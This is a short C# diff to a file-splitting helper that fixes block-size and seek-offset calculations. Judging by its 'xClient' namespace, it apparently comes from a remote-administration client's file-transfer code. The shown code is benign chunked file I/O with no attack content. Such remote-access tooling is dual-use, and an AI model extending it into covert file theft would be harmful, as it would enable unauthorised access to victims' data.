@@ -7,7 +7,7 @@ namespace xClient.Core.Helper
     {
         private int _maxBlocks;
 
-        private const int MAX_PACKET_SIZE = (1024*512);
+        private const int MAX_PACKET_SIZE = Client.MAX_PACKET_SIZE - Client.HEADER_SIZE - 1;
         public string Path { get; private set; }
         public string LastError { get; private set; }
 
@@ -68,7 +68,7 @@ namespace xClient.Core.Helper
                     }
                     else
                     {
-                        fStream.Seek(blockNumber*MAX_PACKET_SIZE + 1, SeekOrigin.Begin);
+                        fStream.Seek(blockNumber*MAX_PACKET_SIZE, SeekOrigin.Begin);
                         readBytes = new byte[this.GetSize(fStream.Length - fStream.Position)];
                         fStream.Read(readBytes, 0, readBytes.Length);
                     }
@@ -115,7 +115,7 @@ namespace xClient.Core.Helper
 
                 using (FileStream fStream = File.Open(this.Path, FileMode.Append, FileAccess.Write))
                 {
-                    fStream.Seek(blockNumber*MAX_PACKET_SIZE + 1, SeekOrigin.Begin);
+                    fStream.Seek(blockNumber*MAX_PACKET_SIZE, SeekOrigin.Begin);
                     fStream.Write(block, 0, block.Length);
                 }
 
